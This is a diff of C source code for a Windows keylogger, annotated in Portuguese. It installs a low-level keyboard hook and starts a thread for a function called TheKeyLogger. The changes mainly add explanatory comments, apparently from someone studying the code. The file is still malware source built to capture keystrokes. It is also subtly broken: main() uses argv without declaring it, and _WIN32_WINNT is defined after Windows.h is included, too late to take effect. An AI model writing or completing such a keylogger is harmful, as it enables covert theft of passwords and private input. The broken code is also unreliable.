@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <Windows.h> //contém as funções de captura de teclado. É um linguagem de mais baixo nível
+#define _WIN32_WINNT 0x0400  //constante para pegar funionalidades para o sistema operacional pegar algumas funcionalidades importantes para o funcionamento do código
 
 //função que vai desviar o teclado
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){ //LRESULT CALLBACK significa que sempre que receber um resultado (no caso, sempre que um usuário pressionar ou soltar uma tecla) então vai chamar a função de novo
@@ -41,8 +42,8 @@ DWORD WINAPI TheKeyLogger(){//injetar o código no sistema operacional
 }
 int main(){
 
-    HANDLE hThread; 
-    DWORD dwThread;
+    HANDLE hThread; //tipo handle é da api do windows é um manipulador de processo e uma thread é uma tarefa executada pelo processador dentro de um processo (exemplo: dentro da aba de um navegador, há várias thread: uma que renderiza a página, outra roda js, outra carrega recursos)
+    DWORD dwThread; // 
 
     hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)TheKeyLogger, (LPVOID)argv[0], NULL, &dwThread); //cria uma nova thread para rodar o TheKeyLogger
     if(hThread)//verifica se a thread está rodando
